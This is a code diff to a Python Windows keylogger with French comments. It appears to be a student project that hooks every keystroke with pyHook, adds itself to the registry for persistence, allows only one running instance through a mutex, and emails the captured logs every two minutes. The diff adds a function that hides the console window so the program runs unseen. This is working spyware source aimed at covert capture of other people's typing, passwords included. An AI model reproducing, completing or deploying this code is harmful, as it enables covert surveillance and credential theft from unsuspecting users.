@@ -13,6 +13,7 @@ import datetime,time
 import win32event, win32api, winerror
 from _winreg import *
 
+
 # Interdiction de plusieurs instanciations
 # Processus mutex : filtre
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -22,6 +23,15 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     exit(0)
 data = ''
 count = 0
+
+
+# Dissimule la console
+def hide():
+    import win32console,win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
+    return True
+
 
 # Persistance
 def persistance():
@@ -34,6 +44,7 @@ def persistance():
     clef_base_registre = OpenKey(HKEY_CURRENT_USER,clefVal,0,KEY_ALL_ACCESS)
     # Ajout de la clef
     SetValueEx(clef_base_registre, "FabVinKevJim-key",0,REG_SZ, nouveau_chemin)
+
 
 # Envoie des logs par mail (Thread pour plus de dynamisme sans affecter la mémoire vive)
 class TimerClass(threading.Thread):
@@ -73,8 +84,9 @@ class TimerClass(threading.Thread):
                     server.quit()
                 except Exception as e:
                     print e
-                    print "Problème envoie de MAIL > KV.exe.logs"
+                    print "Problème envoie de MAIL > dist\\KV.exe.logs"
             self.event.wait(120)
+
 
 # Identification des touches (stdin == clavier)
 def pression(event):
@@ -87,17 +99,21 @@ def pression(event):
         touche = '<TAB>'
     else:
         touche = chr(event.Ascii)
-    data = data + touche
+    data += touche
+
 
 # Main
 def main():
     persistance()
+    hide()
     email = TimerClass()
     email.start()
     return True
 
+
 if __name__ == '__main__':
     main()
+
 
 # Lancement : réception du signal des touches
 obj = pyHook.HookManager()
